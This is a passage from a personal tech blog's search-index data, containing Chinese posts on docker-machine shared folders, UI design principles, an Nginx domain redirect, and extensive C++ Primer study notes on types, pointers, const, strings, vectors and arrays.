使用 vboxmanage sharedfolder add 添加共享文件夹vboxmanage sharedfolder add default --name &quot;dir/path/on/linux&quot; --hostpath &quot;dir/path/on/local/windows&quot; --automount # 最后重启远程主机docker-machine start default 注：此处假设远程主机名为 default，如果不是，则相应修改","categories":[{"name":"文章","slug":"文章","permalink":"http://example.com/categories/%E6%96%87%E7%AB%A0/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://example.com/tags/docker/"}]},{"title":"界面设计的原则","slug":"界面设计的原则","date":"2019-03-28T00:11:11.000Z","updated":"2024-09-22T23:08:43.583Z","comments":true,"path":"2019/03/28/界面设计的原则/","permalink":"http://example.com/2019/03/28/%E7%95%8C%E9%9D%A2%E8%AE%BE%E8%AE%A1%E7%9A%84%E5%8E%9F%E5%88%99/","excerpt":"","text":"好看并不是界面设计的第一要义，实现产品目标才是。 一个好看，却不实现产品目标的设计，是差劲的； 一个不好看，但实现产品目标的设计，是合格的； 一个又好看，又实现产品目标的设计，是优秀的； 评价一个设计的好坏，步骤顺序如下： 先写出每个界面的产品目标，然后分析设计元素的使用，是否服务并实现了这个目标； 在实现第1条的基础上，根据设计的原理和规范，从颜色、版面、字体等维度，逐项检查设计是否满足了相关的设计原则，实现了美观； 当设计要素之间有冲突的时候，应该依据哪项更好的实现产品目标，进行取舍；","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"设计","slug":"设计","permalink":"http://example.com/tags/%E8%AE%BE%E8%AE%A1/"}]},{"title":"Nginx 实现域名跳转","slug":"Nginx 实现域名跳转","date":"2019-03-01T09:00:10.000Z","updated":"2024-09-21T23:17:26.286Z","comments":true,"path":"2019/03/01/Nginx 实现域名跳转/","permalink":"http://example.com/2019/03/01/Nginx%20%E5%AE%9E%E7%8E%B0%E5%9F%9F%E5%90%8D%E8%B7%B3%E8%BD%AC/","excerpt":"","text":"目标：当访问 a 域名的目录 abc 时，跳转到 b 域名的目录 abc， nginx 新增一条 server 配置实现：1234567server &#123; listen 80; server www.a.com; location /abc/ &#123; rewrite .+ http://www.b.com/$request_uri permanent; &#125;&#125; 123注：其中 $request_uri 表示请求参数的原始URI例如假设访问链接为：http://www.mysite.com:80/test1/test2/test3.html，则 $request_uri 表示 /test1/test2/test3.html","categories":[{"name":"工具","slug":"工具","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"网络","slug":"网络","permalink":"http://example.com/tags/%E7%BD%91%E7%BB%9C/"}]},{"title":"C++ Primer","slug":"C++ Primer","date":"2019-02-20T07:36:00.000Z","updated":"2024-09-22T23:08:41.982Z","comments":true,"path":"2019/02/20/C++ Primer/","permalink":"http://example.com/2019/02/20/C++%20Primer/","excerpt":"","text":"基本概念 UNIX 系统中，编译器通常默认将可执行文件命名为 a.out（以 .out 为后缀），但其实也可以没有后缀；windows 系统则是以 .exe 为后缀； 可以通过 echo 获取 main 函数的返回值；如果 main 返回 0，则 echo 显示结果为 0；如果 main 返回 -1，使用 echo 获取显示结果为 255； 标准库 iostream 定义了两种类型，4个对象， istream 类型：只有1个对象，cin； ostream 类型：有3个对象，分别为 cout, cerr, clog； 写入 cerr 数据一般不缓冲，写到 clog 一般有缓冲； &lt;&lt; 输出运算符，用法：左边为接收数据的输出对象，右边为输出的内容，返回结果仍为输出对象，因此支持链式输出，即右侧可以不断的接收更多的 &lt;&lt; 运算符及内容； 示例： std::cout &lt;&lt; “The content to print out” &lt;&lt; std::endl; &gt;&gt; 输入运算符的用法与输入出运算符类似，左侧为输入流对象，右侧为接收数据的对象，从输入流对象将数据赋值给右侧的对象；并返回输入流对象； std::endl 中的 “endl” 很特殊，它是一个操纵符 manipulator，效果是结束当前行，同时它可以将设备关联的缓冲区的数据写入设备（流）中，而不是仅停留在内存的缓冲区中等待写入流； 这里面暗含了一个问题，在使用打印语句来调试程序时，当程序出现崩溃的时候，如果打印的内容没有写入流，而只是在缓冲区，则打印语句没有起到效果，这样可能会误导错位位置的推断； 这么说来，可以考虑使用 endl 确保每次打印的内容会写入流中，而不是丢失在缓冲区中； 标准库中的定义的所有名字都在 std 命名空间中，因此需要使用 std::cout 来访问 cout，这样可以避免命名冲突；缺点就是书写起来会稍微麻烦一点； 在 cygwin 下貌似只能用 g++ 编译源文件，无法使用 cc 来编译；但是在 win10 的 ubuntu 子系统则可以； 错误的注释比完全没有注释更糟糕，因为它会误导其他人； 假设 int value &#x3D; 0; while ( std::cin &gt;&gt; value ) 此处从文件流中取值并赋给变量 value，由于 value 是整数类型，当 std::cin 的值不是整数类型时，istream 对象的状态会变成无效，处于无效状态的 istream 对象会使得 while 条件变为假，从而使得循环终止；（说明 istream 对象为做条件语句时，会触发类型转换，变成一个 bool，而这个布尔值的数据，猜测应该存储在 istream 对象的某个成员中的） 每个类实际上都定义了一种新的数据类型，其类型名称就是类的名称； 在动手定义类之前，先手工罗列一下类所允许的操作； IO 设备通常会将数据先保存在一个缓冲区中，读写缓冲区的动作，与程序中的读写动作是不相关的；可以显式的刷新缓冲区，强制将数据从缓冲区写入设备；默认情况下，读 cin 的时候会刷新 cout；程序异常中止时，也会刷新 cout； 数据结构：数据以及允许对这些数据进行的操作的一种逻辑组合； 双冒号 :: 表示作用域运算符，用来访问某个命名空间中的名字（这么说类的内部也算是一个命名空间？）；点 . 运算符则用来访问对象的成员； 由于全局作用域没有名字，因此当出现 ::var 的用法时，表示要访问全局作用域下的 var 变量； 单冒号：除了和问号组成条件运算符外，还有一种应用场合是在类的构造函数中，用来给数据成员提供默认初始值；（条件运算符也即 js 中的三元运算符）； 变量和基本类型 基本内置类型 可寻址的最小内存块称为“字节”；存储的基本单元称为“字”（其实“字”不仅仅出现在存储场合，它应该算是计算机单次操作的一个基本单位）； 如果两个字符串字面值位置相邻在一起，中间仅由空格、换行符、缩进三者隔开，则它们属于同一个字符串； 示例：“abc” “def” 表示上看，像是两个字符串，其实它们是一个字符串；最终输出其实是”abcdef”（这种语法规则很是误导人，应该直接报错就好，而不是兼容它）； 转义序列一般是用字母来表示某个特殊字符，但也可以使用泛化的转义序列，即斜杠加数字（8进制或16进制）来表示某个特殊字符； 这么说可以使用转义序列打出一个有趣的符号组成的图案； 当要表示一个长整形字面值时，后缀应使用大写的字母 L 而不要用小写，因为小写的字母 l 看起来像是数字壹“1”； 变量 C++ 中初始化与赋值的区别 初始化是指创建变量的时候，给变量一个初始值； 赋值是指擦除对象的当前值，用一个新值取代； 在 C++ 中变量和对象是同一个意思，都用来表示一段具名的、可供程序操作的内存空间（感觉这一点跟 C 语言很像）（理解这一点非常重要，它涉及了硬件的基本工作原理） C11 开始支持列表初始化的语法，使用花括号来初始化； 示例：int units_sold &#x3D; {10}; 无论是初始化对象，还是为对象赋新值，都可以使用花括号语法（怎么好像是一切皆对象的感觉？） 列表初始化有一个好处，即会提示无意中产生的类型转换错误，示例如下： long double ld &#x3D; 3.1415926536; int b &#x3D; {ld}； &#x2F;&#x2F; 此处编译器会提示类型转换错误，因为双精度转整型，会丢失部分数据； int b &#x3D; ld；&#x2F;&#x2F; 不会报错，但实际上有损失产生； 在函数体内声明的变量，如果没有初始化，则会产生不可预料的后果；原因：在函数体外声明的变量，如果没有初始化，编译器会给一个默认值，默认值多少取决于变量的类型；因此：强烈建议手工初始化每一个内置类型的变量； 类的对象如果没有显式的初始化，则其默认值由类来决定；（类会有一个默认构造函数，它可能是类的实现者定义的，也有可能是编译器合成的） 分离式编译：把程序分成多个文件，然后每个文件独立编译； 声明操作（declaration）使得变量名字被程序各部分所众知；定义操作（definition）则负责创建与名字关联的实体；定义会申请存储空间，并可能会给变量赋一个初始值； 这么说声明的时候，是没有申请存储空间的？所以仅有声明的类型，是不可使用的？ 如果想要声明一个变量，但不定义它，可以使用 extern 关键字来实现（貌似是 external 单词的缩写，表示该变量在外部定义）； 示例：extern int i; 注意，它跟 int i 是不同的，int i 做了声明加定义甚至是初始化的动作； 如果 extern 语句有给变量赋值，则该语句不再是声明，而是定义了，例如 extern int i &#x3D; 3; 在这种情况下，extern 的作用被抵销，变得多余了；在函数体内部这么做会报错； extern 有两个作用 当在某个文件中初始化变量时使用它时，表示这个变量可以被外部其他文件访问； 当在某个文件中声明它时（未定义），可表示这个变量是由外部其他文件定义的； extern 还有一个用法即 extern C，它表示该部分内容（例如某个函数）应按照类 C 的标准，进行编译，这样其他遵循同样标准的语言，就可以调用 C++ 里面的这个函数 变量仅能被定义一次，但可以多次声明？ 如果想要在多个文件中使用同一个变量，则应该将声明和定义分开； 此时，变量必须且仅能够在一个文件中进行定义；其他使用这个变量的文件，需要对变量进行声明，但不能重复定义； 这一段有点绕，待研究一下其使用场景；（看完整本书，大概明白了一点使用的场景，它使用在想要定义某个全局变量的场合） 假设我们要定义一个全局变量，供多个文件进行引用； 做法： 我们创建一个头文件 common.h，在里面使用 extern 关键字声明这个全局变量，例如 extern int global; 然后在其他想要引用它的源文件中，包括这个头文件 #include “common.h” 接下来，我们只需要在多个源文件中的某一个，对这个全局变量进行定义，例如 global &#x3D; 42; 然后其他同样引用了这个头文件的源文件，就会自动共享获得这个全局变量的定义； 原理：编译器只负责编译，真正实现共享的是连接器，它将会使用到这个变量的其他源文件，与定义这个变量的源文件建立连接 注意： 变量在定义的那个源文件中，需要处于顶层作用域，以便其他文件可以访问得到；而不是局部作用域（例如某个函数内部）； 变量不可以定义为 static 静态类型，因此类型同样会限制访问权限； 标识符的规范 只能由字母、数字和开划线组成； 不能以数字开头； 不能出现两个连续的下划线；（没测试成功） 函数体外的标识符，不能出现下划线+大写字母开头（没测试成功）； 名字的有效区域始于声明名字的位置，结束于声明语句所在作用域末尾； 复合类型 引用：为对象起了另外一个名字，引用即别名；它的本质是将一个标签，绑定到某个已经存在的对象上面；而一般的变量初始化，是将值拷贝给一个新建的对象； 当定义了一个引用后，对引用所进行的操作，都会作用到它所绑定的对象上面； 引用的语法：类型名 &amp;引用名 &#x3D; 对象名 示例：int &amp;refVal &#x3D; ival; 由于引用是指向一个已经存在的对象，所以创建引用必须同时初始化，因为引用不能单独存在，它必须跟某个对象绑定才有存在的意义； 引用的类型，需要与绑定的对象的类型严格匹配，不匹配会报错； 引用只能绑定在已有对象上，不能绑定在值上，例如整数、浮点数、字符等；除非这个引用是一个常量引用类型，常量引用类型可以绑定字面值、非常量对象； 值是一个临时的对象，但表达式语句结束后，很快会被销毁； 由于引用本身不是一个对象，所以不能定义引用的引用； 虽然不能定义，但有可能会间接的创建出来，例如在定义模板参数或类型别名时 引用的引用可能会触发折叠； 字面值可以用来初始化一个常量引用，但不能用来初始化一个非常量引用，即 const int &amp;r &#x3D; 42 是OK的，但 int &amp;r &#x3D; 42 是错误的； 指针 指针与引用的不同点在于，指针本身是一个对象，因此它是可以被赋值的； 指针在生命周期内可以指向多个不同的对象；（这么说，引用不行？试了下，确实不行；引用并不是对象，没有内存空间，它只是一个别名） 指针无须在定义时赋初始值，但是，在块作用域内，这么做会带来不可预估的后果；（或许可以让它的初始值为 nullptr） 由于引用不是对象，因此它没有地址，因此也不能定义指针指向一个引用； 空指针使用 nullptr 来表示，示例：int *ptr &#x3D; nullptr（尽量避免使用 NULL)，等价于 int *ptr &#x3D; 0; 指针如果未被初始化，大多数编译器会默认将指针所在地址的内容当作默认内容，但实际上它本不应存在，如果里面刚好有内容，则会出现不可预料的错误； 最好的做法： 先定义好对象，再定义指向对象的指针； 如果做不到第1条，则指针必须初始化为 nullptr； void* 是一种特殊类型的指针，它可以存放任意类型的指针地址，但局限是不能通过它来访问地址所指向的对象，因为我们并不知道对象的类型，所以这种访问也没有意义； 通过星号 * 的个数，可以用来判断指向指针的指针的层次； 由于指针是一个对象，因此可以定义一个引用指向它，例如：int *&amp;r &#x3D; p，此处判断 r 的类型的办法对声明语句从右往左阅读，第一个字符是 &amp; 表示它是一个引用，第二个字符是 * 表示它是一个指针引用，第三个字符 int 表示它是一个整数类型的指针引用； 解引用的英文 dereference，缩写 deref； const 限定符 const 可以用来声明一个初始化以后不可再修改的常量，因此它在声明的时候必须同时初始化（不然就没有机会赋值了）；它可以是任意类型，而且使用方式也同普通变量相同，唯一的不同点是不能修改它的值，否则会报错； 默认状态下 const 变量仅在当前文件内有效；如果想要在多个文件中共享 const 变量，则应该在变量定义语句前加上 extern 的关键字； 非常量不可引用常量，因为这样会触发常量被修改的可能： const int a &#x3D; 10; int &amp;b &#x3D; a &#x2F;&#x2F; 此处试图使用非常量引用常量，是错误的； const int &amp;b &#x3D; a; &#x2F;&#x2F; 这样就可以 正常情况下，引用的类型需要与其被引用对象的类型一致，但有一种例外情况，即常量引用在初始化的时候，允许使用任意表达式，只要该表达式的结果，可以转换成常量引用的类型（编译器会生成一个临时量来存储转换化的结果）(即 A 类型常量引用可以被绑定到 B 类型对象上，由于引用是常量，不允许赋值，所以这种绑定可以成立；但如果引用本身不是常量，可以赋值，则这种绑定会报错是）；示例： doubal dval &#x3D; 3.14; const int &amp;ri &#x3D; dval; &#x2F;&#x2F; 常量引用非常量，这是OK的； 对于表达式 const int &amp;r1 &#x3D; 42 来说，怎么感觉 42 在这里像是被当作一个对象来处理？（它不是对象，是一个字面值） 常量引用仅对引用本身可参与的操作做出了限制，而对引用的那个对象是否是一个常量，却没有限制；即常量引用可能引用的是一个非常量； 指向常量的指针，也需要定义成常量类型，即 const double val &#x3D; 3.14; const double *ptr &#x3D; val; （注：开头不能少了 const 限定符） 指针的类型需要与指向的对象的类型相一致，但有一种例外，即允许常量指针指向一个非常量对象，但是无法通过这个常量指针改变非常量对象；（即常量指针与常量引用一样，会被限制操作） 所谓的常量指针或常量引用都是“自以为是”的家伙，他们以为自己是常量类型了，就应该自觉的不去改变所指向的对象的值； 常量指针：指针由于是一个对象，所以它自己也可以是一个常量，这个时候，常量指针和指向常量的指针二者是不一样的意思，辨识的方法在于从右往左读，示例如下： int val1 &#x3D; 2; int *const ptr1 &#x3D; &val; &#x2F;&#x2F; 从右往左读，依次是 const &gt; * &gt; int，表示 prt1 是一个常量，指针类型，指向整数类型对象； ptr1 是一个常量，意味着它不可以被重新赋值和修改了； const int val2 &#x3D; 4; const int *const ptr2 &#x3D; &val2; &#x2F;&#x2F; 从右往左读，依次是 const &gt; * &gt; int &gt; const，表示ptr2 是一个常量，指针类型，指向整数类型的常量对象； 指针本身是常量，只是表示它所存的目标对象地址不改变，但不意味目标对象不可改变，只要目标对象是非常量，即可通过该指针改变目标对象； int dval &#x3D; 2; int *const ptr &#x3D; &dval; *ptr &#x3D; 3; &#x2F;&#x2F; 成立； 当指针本身是常量类型时，它声明时必须进行初始化； 普通类型的指针，不能指向常量变量，必须是指向常量类型的指针，才可以指向常量变量； const int dval &#x3D; 2; const int *ptr &#x3D; &dval; &#x2F;&#x2F; 正确 int *ptr &#x3D; &davl; &#x2F;&#x2F; 错误，非常量指针，不可指向常量对象 int *const ptr &#x3D; &dval; &#x2F;&#x2F; 错误，原因同上；ptr 内层有 const ，表示本身是常量没有用，要外层的 const 才能表示它指向一个常量对象 指向常量的指针，不能赋值给普通指针； const int dval &#x3D; 2; const int *ptr1 &#x3D; &dval; int *ptr2 &#x3D; ptr1; &#x2F;&#x2F; 错误，ptr2 不是一个指向常量的指针，所以无法匹配 ptr1 指向的对象的类型； 外层 const 指针要求所指向的对象类型相同，或者除非类型能够转换，例如非常量能转成常量，反之则不行，即常量不可被非常量所指向； 常量表达式 const expression ：在编译间即可获得不会改变的初始化常量值的表达式（有什么用？编译器可以进行检查，确保类型正确） 在 C11 的标准中，引入了 constexpr 类型来声明一个常量表达式，这样编译器会进行检查，确保类型正确； 仅在满足 constexpr 函数的情况下，才允许使用函数对常量表达式进行赋值；此类函数比较简单，可以编译期间获得返回值； const int *p 和 constexpr int *q 中，p 和 q 是两种类型，前者指其指向的整数类型是常量，后者指其本身是一个常量，指向的对象则是整数； 怎么感觉 constexpr int *q 和 int * const q 是一个意思？ 处理类型 类型别名：通过使用类型别名，来让类型的名称更有意义，更容易阅读和理解；有两种声明别名的方式 传统方式，使用 typedef 关键字，示例： typedef double wages; &#x2F;&#x2F; 此处使用 wages 来做为 double 的别名； 新标准，使用 using 关键字，示例：using wages &#x3D; double; 当使用别名来定义复合类型时，在将其用到声明语句中的时候，记得不要使用简单的替代来理解，而应该将其当作一个独立小个体来理解；示例如下： typedef char *pstring; &#x2F;&#x2F; pstring 是一个指向字符的指针； const pstring cstr &#x3D; 0; &#x2F;&#x2F; 由于 pstring 是一个指针，因此此处的 const 是用来修饰指针的，const pstring 是指一个本身为常量的指针，指向字符类型对象； const pstring *ps; &#x2F;&#x2F; ps 是一个指针类型，它指向的对象的类型是 pstring 常量指针对象； 发现 const 是用来修饰它右侧出现的类型的； auto 类型说明符 貌似算是新标准引入了动态类型推导，示例：auto item &#x3D; val1 + val2; &#x2F;&#x2F; 此处将会根据 val1 和 val2 的相加结果来自动判断 item 所属的类型； 编译器在做 auto 类型推导时，并不一定会严格等同 它会忽略内层的 const，而只保留外层的 const ； 如果希望确保结果是内层 const 类型，则应另外添加 const 修饰符； 不能将非常量引用绑定到字面值； 错误示例：auto &amp;h &#x3D; 42; 正确示例：const auto &amp;h &#x3D; 42; 如果在一条语句中，声明多个变量，则以最左边第一个类型为准，如果类型不同，会引发错误，示例如下： int i &#x3D; 42; auto k &#x3D; i, &amp;t &#x3D; i; &#x2F;&#x2F; 其中 k 是整型，t 是整型引用； decltype 类型说明符 使用场景：想要得到一个表达式的类型，用来给某个变量声明相应的类型，但不想用表达式的值来给变量初始化（编译器会分析出返回值的类型以得到想要的结果，且不用将返回值算出来） decltype 有点跟 auto 不同，如果表达式是一个变量，它会返回变量的类型，包括内层 const 和引用在内； 引用从来都做为其引用对象的替身出现，唯一的例外情况是在 decltype； decltype 中的表达式，如果是一个解引用，则结果为引用类型，示例如下： int i &#x3D; 0, *p &#x3D; &i; decltype(*p) 返回的是 int &amp;，而非 int ; 当 decltype 中的表达式使用括号（双层括号）时，返回的结果永远是引用类型（当变量被加上括号时，就不再是变量了，而被当成了表达式处理）；而当表达式是一个变量时，只有在变量是引用类型时，返回的结果才是引用类型； 赋值是会产生引用的一种表达式，因此 decltype（ 赋值表达式）格式的结果是赋值表达式左值的类型； 赋值运算符一般返回引用； 自定义数据结构 不要忘了在类定义的后面加上分号，不然它后续跟着的其他内容，会被当成声明语句的一部分； C11 标准允许在定义时给类成员设置初始值，如果没有设置，编译器会自动初始化； 为了确保使用类的各个文件有一致的类定义，一般将类定义在一个单独的头文件中，给其他文件引用；（头文件一般用来包含那些只能被定义一次的实体，例如类，const，constexpr等）； 某些通用的头文件可能会遇到被多次包含的情况，需要使用预处理器的预处理变量，进行适当处理，以便能够正常工作； #define 将某个变量设置为预处理变量； #ifdef 用来检查某个预处理变量是否已经定义； #ifndef 用来检查某个预处理变量未定义； #ifdef 或 #ifndef 如果判断条件为真，则会执行后续相应的操作，直到遇到 #endif 为止； 通过使用以上四个头文件保护符，来避免重复包含的发生； 为了避免与程序中的其他实体发生冲突，一般预处理变量名字全部使用大写以示区分；事实上预处理变量的名字不太重要，可以自定义，但为了显示出意义，一般将它命名成头文件的名称一致的写法，例如头文件名称为 Sales_data.h ，则预处理变量命名为 SALES_DATA_H 不管头文件是否已经包含在其他文件，都应该习惯性的加上头文件保护符 字符串、向量和数组 命名空间的 using 声明 字符串 string 和向量 vector，是数组类型（更基础）的某种抽象； 通过模板来实现 字符串支持可变长度，向量支持可变长的集合； 据说数组与硬件的实现直接相关，因此抽象程度不高，灵活性有一些不足； 使用 using namespace::name 来引入命名空间 namespace 中的某个成员 name，例如做了 using std::cin 的声明后，在代码中就可以直接使用 cin 了，而无须再加上 std:: 的前缀了； 还有一种引入方法叫 using 指示，它会引入命名空间的所有成员到当前作用域的父空间 标准库类型 string 定义和初始化 string 对象 string 对象有好几种初始化的方式，使用哪种方式，是在类里面规定的，可用的方式包括: string s1; &#x2F;&#x2F; 定义空字符串，默认初始化 string s2 &#x3D; s1; &#x2F;&#x2F; 拷贝赋值运算符 string s3(s1); &#x2F;&#x2F; 拷贝构造 string s4(“value”); &#x2F;&#x2F; 构造初始化，形参字面值常量（const char*[ ]） string s5 &#x3D; “value”; &#x2F;&#x2F; 拷贝赋值运算符重载，字面值常量版 string s6(n, ‘c’); &#x2F;&#x2F; 构造初始化，形参 (int, char） 拷贝初始化：使用等号赋值时，执行的是拷贝初始化；&#x2F;&#x2F; 编译器有可能会自动优化转成直接初始化 直接初始化：如果不使用等号，则执行的是直接初始化； string 对象上的操作 类除了确定对象的初始化方式外，还用来定义对象上可以执行的操作，包括使用函数调用，或者也可以定义各种 &#x3D;、&lt;&lt; 等符号在类对象上的新含义（运算符重载）； 可以使用 IO 操作符（输入输出运算符） &lt;&lt; 和 &gt;&gt; 来读写 string 对象；string 会忽略空白，会从第一个非空白开始读，并到下一个空白处结束； getline(is, s) 用来获取一整行，包括空白符；有读入换行符，但没有给 s ； s.empty( ) 用来判断当前字符串是否为空； s.size( ) 用来获取当前字符串的长度； size( ) 函数会返回 string::size_type 类型，它是一个无符号整数类型，因此当表达式中有 size_type 类型时，应避免使用 int 类型一起计算，因为编辑器会默认将 int 类型转换成 unsigned，如果 int 的是负数，则转换后的 unsigned 是一个很大的数，有可能出现意想不到的结果； &#x3D;&#x3D;，!&#x3D; 用来判断两个字符串是否相等（对大小写敏感）； &lt;, &lt;&#x3D;, &gt;, &gt;&#x3D; 用来判断两个字符串的字典顺序（对大小写敏感） 可以用来串接字符串，就像 python 中的那样； 两个 string 对象，或者 string对象和字面值，都可以相加；（为了与 C 兼容，字符串字面值与 string 对象并不是同一种类型） 目测实现原理应该是重载了加号运算符，使其接收字符串字面值类型； 不过好奇 string 对象是否要求必须写在左边？ 但是，两个字面值之间，需要确保至少有一个 string 对象； 貌似这里应该跟加号的结合顺序有关系？ 处理 string 对象中的字符 for (auto item_name: list_name) 语句可以用来迭代处理 list 中的每一个元素； 如果想改变 list 中的元素，则 declaration 应该使用引用类型，例如 for ( &amp;c : str ) { … }; 不知 auto 推断出的默认类型是否为常量引用？这样既能提高性能，又不会修改原值； 下标运算符返回的是引用，即可以通过下标来改变元素的值；除非字符串是常量，不可改变； 不管什么时候，使用下标访问字符串的元素值，都应该检查一下字符串是否为空； 原因：如果为空，下标访问会出现不可预知的后果； 貌似下标运算符的重载函数有设置自动检查？ 使得下标必须严格检查其取值范围不会越界，一般通过下面两条实现 先声明下标为 decltype(s.size()) 类型（原理：该类型是 无符号整数，这样可以确保下标不会小于0） 再设置 index &lt; s.size()（原理：可确保下标不会大于 size） int 转字符串，to_string(int) 标准库类型 vector 定义和初始化 vector 对象 vector 表示对象的集合，也叫做容器； vector 是一种类模板，类模板不是类，类模板的实例化，会生成类； vector ivec 表示 ivec 是保存 int 类型对象的容器； 几种初始化 vector 对象的方式 vector v1; vector v2(v1); vector v3 &#x3D; v1; vector v4(n, val); vector v5(n); vector v6{a, b, c, …}; vector v7 &#x3D; {a, b, c, …}; 圆括号表示使用构造的方式初始化，花括号表示使用列表的方式初始化； 确切的说，圆括号会调用构造函数；等号和花括号会调用运算符函数； 向 vector 对象中添加元素 vector 先声明为空，再动态添加元素的性能更好，比一开始就声明长度的性能更好，这点和 C 、Java 不同；（问：背后的原理是什么，为什么性能会更好？） 可以使用 push_back 往集合中添加元素； 示例：vec.push_back(val); vector 的其他操作 对于 &lt;, &lt;&#x3D;, &gt;, &gt;&#x3D; ，只有 vector 的元素本身具备可比性时，例如 string 类型，这种比较才可行，否则会报错； 使用下标访问时，下标的类型应为 vector::size_type，而不是 vector::size_type，即记得写出 vector 的元素类型； 原因：vector 本身是一个模板，不是一种类型，需要提供类型参数给它，才能实例化出一种类型 下标运算符可以用于访问已经存在的元素，但不能用于添加还不存在的元素（此点跟其他语言不同，需要注意）； 如果使用下标运算符访问不存在的元素，就会造成缓冲区溢出，带来安全问题； &#x3D;&#x3D; 可以用来判断两个 vector 是否相等； 迭代器 string 和 vector 可以通过下标访问元素，此外还可以通过迭代器来访问元素；虽然 string 不是容器类型，但它也支持容器相关的操作；vector 是容器类型，但它也支持下标访问；除了 vector 外，其他仅少数几种容器类型支持下标访问，但它们都支持迭代器访问； 迭代器实现的是容器内元素的间接访问，即访问返回的是一个引用，类似指针类型，而不是元素对象本身；因此，如果要对元素对象进行操作，需要使用解引用符星号 *；示例：（看到这里，终于明白 SW::JSON 库返回的原来是一个迭代器） ele &#x3D; v.begin() *ele &#x3D; toupper(*ele); for 循环中使用 !&#x3D; 进行判断，比使用 &lt; 进行判断更好，原因在于，!&#x3D; 可以支持标准库提供的所有容器类型上，而 &lt; 则只支持数值类型； 迭代器支持的操作 使用 ++ 自增运算符来访问下一个元素； 使用 – 来访问上一个元素； iter1 &#x3D;&#x3D; iter2 判断两个迭代器是否相等；如果两个迭代器指向同一个元素，或者都指向尾迭代器，则它们相等，否则它们不等； 通过 +n 和 -n 可以一次移动 n 个元素； 通过 +&#x3D; n 或 -&#x3D; n 可以对某个元素进行加减 n 后赋值； &lt;, &lt;&#x3D;, &gt;, &gt;&#x3D; 四个关系运算符用来表示两个迭代器对象的前后位置关系； 减号可以用来计算两个迭代器对象的距离；（前提：它们指向同一个容器） 数组 定义和初始化内置数组 与 vector 的不同点在于，数组要求大小固定，不能往里面增加元素；由于大小固定，因此其优点是性能更好；缺点是无法增加元素，不能应对变化，使用上不灵活； string a[ n ] 此处通过 n 来设定数组的维度，它也是数组的元素数量的上限； n 可以是一个表达式，但必须是常量表达式； 可以通过列表来初始化数组，但列表中的元素数量应不大于维度值；也可以不写维度值，如果不写，则默认数组的维度即列表的元素数量； 如果数组的元素值没有初始化，编译器会默认对其进行初始化； 数组的元素必须是对象，不能是引用； 定义数组时，必须指定元素的类型，不允许使用 auto 来推断类型； 估计应该可以使用 decltype(expression) 来获得类型以供定义； 字符数组的特殊性在于，末尾需要有一个空字符，用来表示字符数组的结束（这一点估计是为了兼容 C 造成的）； 当使用字符串字面值对字符数组进行初始化时，会自动添加一个空字符做为结束（很好奇，字符串字面值不是本来就自动带一个表示结束的空字符吗？如果是的话，就算不上是自动添加，而是原封不动的拷贝？）（猜测字符串值应该没有带结束符） 假设使用字符串字面值来初始化字符数组，则字符数组的长度是字符数量加1； char str[ ] &#x3D; “abcdef”, sizeof(str) 的值是 7 注意：数组没有 size() 方法，只能通过 sizeof 来获取长度； string str &#x3D; “abcdef”, str.size() 的值是6 而不是 7； 不允许用一个数组来给另外一个数组赋值（这点倒是跟 C 一样，估计也是需要使用 strcpy 或 memcpy 之类的），也不允许使用一个数组来初始化另一个数组；但可以使用字面值来初始化一个数组； 数组声明时，如果声明语句的部分有括号，则优先使用由内而外的理解，然后再是从右到左的阅读理解； int (*arr)[10] 表示 arr 是一个指针，指向数组，数组有10个元素，元素是 int 类型； int *(&amp;arr)[10] 表示 arr 是一个引用，绑定一个数组，该数组有10元素，元素类型为指针，指针指向 int 类型； 如果在函数体内定义了某种内置数据类型的数组，如果没有初始化，编译器的默认初始化，会使得数组的元素含有未定义的值；应该避免这种用法，而是在函数内部定义数组时同时进行初始化； 时刻牢记初始化； 使用指针和数组定义字符串的区别 const char *cp1 &#x3D; “Hi”; &#x2F;&#x2F; 此处定义了一个指针，并非数组； 注：需要 const，若没有则不合法； char cp2[ ] &#x3D; {‘H’, ‘i}; &#x2F;&#x2F; 此处的数组没有以空字符结束；长度为2； char cp3[ ] &#x3D; “Hi”; &#x2F;&#x2F; 此处的数组是有空字符结束；长度为3； 区别 共同点：编译器会将 “Hi” 存储在常量区 不同点： 指针：编译器在栈中创建一个指针对象，指向常量区的 “Hi” 的地址，不可更改； 数组：编译器从常量区复制一份 “Hi” 的拷贝，放在栈中，可以进行更改； 访问数组元素 数组支持下标访问和范围 for 访问； 使用下标访问时，一般将下标定义为 size_t 类型（机器相关的无符号整数），在头文件 cstddef 中定义（奇怪，好像没有引入这份头文件也可以使用 size_t 类型）； 使用数组时，同 string 和 vector 一样，需要仔细检查下标是否越界的问题，因为它是缓冲区溢出的安全隐患； arr[index] 和 *(arr + index) 是同一个意思；二者都是返回引用； 指针和数组 数组的特征：使用数组名字的地方，编译器实际上在编译时，会将其替换为数组首元素的指针； 如何解释 sizeof(arr) 和 sizeof(ptr) 存在区别？答：数组和指针还是不同的，它们是两种类型; 数组在做为参数传递的时候，会隐式转换为指针; sizeof(ptr) 获取的是指针对象本身占用的内存空间，sizeof(arr) 获取的是整个数组占用的内存空间; 另外 数组和指针的表现，在 C++ 和 C 中也是有一些差别的; 例如 char *p &#x3D; “abc” 在 C 里面是可行的，但在 C++ 不可行，需要表示为 const char *p &#x3D; “abc”; 原因：C++ 要求只有常量指针才能指向常量字面值; 在一些情况下，数组的操作实际上是指针的操作，因此它会带来一些预期外的结果，例如使用 auto 来推断新变量的类型时，如果参数是一个数组，实际得到的变量却会是数组首元素类型的指针，例如： int a1[ ] &#x3D; {1, 2, 3}; auto a2(a1); &#x2F;&#x2F; 此处 a2 的类型被推断为 int * 整型指针；因为 a1 在编译时，被实际替换为 &amp;a1[0]; 使用 decltype 则可以避免 auto 的问题，例如 decltype(a1) a2; &#x2F;&#x2F; a2 得到的类型为整型数组，同 a1 一样； 指针也是迭代器，支持使用自增运算符来遍历数组，为了让循环能够终止，需要获取数组尾元素之后的地址，例如假设数组有10个元素，则尾元素之后的地址为 &amp;arr[10]； 但这种方法很容易出错，更好的做法是使用 C11引入的 begin 和 end 函数来获取数据的首尾指针地址；示例： int *pbeg &#x3D; begin(arr), *pend &#x3D; end(arr); 注意不要在尾后指针上面使用解引用或者自增操作，将会有溢出缓冲区的风险； 指针支持类似迭代器的运算，包括相减，自增，自减，与整数的加减，解引用等； 两个指针相减的结果是一个 